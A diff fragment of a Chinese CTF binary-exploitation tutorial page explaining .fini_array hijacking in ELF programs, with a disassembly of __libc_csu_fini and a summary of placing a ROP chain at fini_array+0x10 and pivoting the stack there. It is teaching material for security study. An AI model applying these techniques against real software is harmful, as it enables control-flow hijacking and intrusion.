+  0x402bd0 &lt;__libc_csu_fini&gt;:    push   rbp
+  0x402bd1 &lt;__libc_csu_fini+1&gt;:    lea    rax,[rip+0xb24e8]        # 0x4***c0 
+  0x402bd8 &lt;__libc_csu_fini+8&gt;:    lea    rbp,[rip+0xb24d1]        # 0x4***b0 
+  0x402bdf &lt;__libc_csu_fini+15&gt;:    push   rbx
+  0x402be0 &lt;__libc_csu_fini+16&gt;:    sub    rax,rbp
+  0x402be3 &lt;__libc_csu_fini+19&gt;:    sub    rsp,0x8
+  0x402be7 &lt;__libc_csu_fini+23&gt;:    sar    rax,0x3
+  0x402beb &lt;__libc_csu_fini+27&gt;:    je     0x402c06 &lt;__libc_csu_fini+54&gt;
+  0x402bed &lt;__libc_csu_fini+29&gt;:    lea    rbx,[rax-0x1]
+  0x402bf1 &lt;__libc_csu_fini+33&gt;:    nop    DWORD PTR [rax+0x0]
+  0x402bf8 &lt;__libc_csu_fini+40&gt;:    call   QWORD PTR [rbp+rbx*8+0x0]
+  0x402bfc &lt;__libc_csu_fini+44&gt;:    sub    rbx,0x1
+  0x402c00 &lt;__libc_csu_fini+48&gt;:    cmp    rbx,0xffffffffffffffff
+  0x402c04 &lt;__libc_csu_fini+52&gt;:    jne    0x402bf8 &lt;__libc_csu_fini+40&gt;
+  0x402c06 &lt;__libc_csu_fini+54&gt;:    add    rsp,0x8
+  0x402c0a &lt;__libc_csu_fini+58&gt;:    pop    rbx
+  0x402c0b &lt;__libc_csu_fini+59&gt;:    pop    rbp
+  0x402c0c &lt;__libc_csu_fini+60&gt;:    jmp    0x48f52c &lt;_fini&gt;
+</code></pre>
+
+<h6 id="64_1">64 位动态链接程序</h6>
+<p>fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。</p>
+<p>gdb 输入 <code>elf</code> 找 <code>.fini_array</code> ，开始地址就是 fini_array[0] </p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png" /></p>
+<p>或者 IDA <code>ctrl+s</code> 找 .fini_array 分段 ：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png" /></p>
+<p>64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。</p>
+<h6 id="_20">静态动态利用方式小结</h6>
+<p>动态程序目前就遇到 <code>2015 hacklu bookstore</code> 这一题，太菜了总结不出规律。</p>
+<p>静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看<a href="https://www.freebuf.com/articles/system/226003.html">淇淇师傅文章</a>。</p>
                 
               
               
@@ -1188,6 +2025,41 @@ p.interactive()
       
         
 <footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../off_by_one/" title="堆基础Off-By-One" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                堆基础Off-By-One
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../../linker/statically_linked/" title="静态链接程序利用" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                静态链接程序利用
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
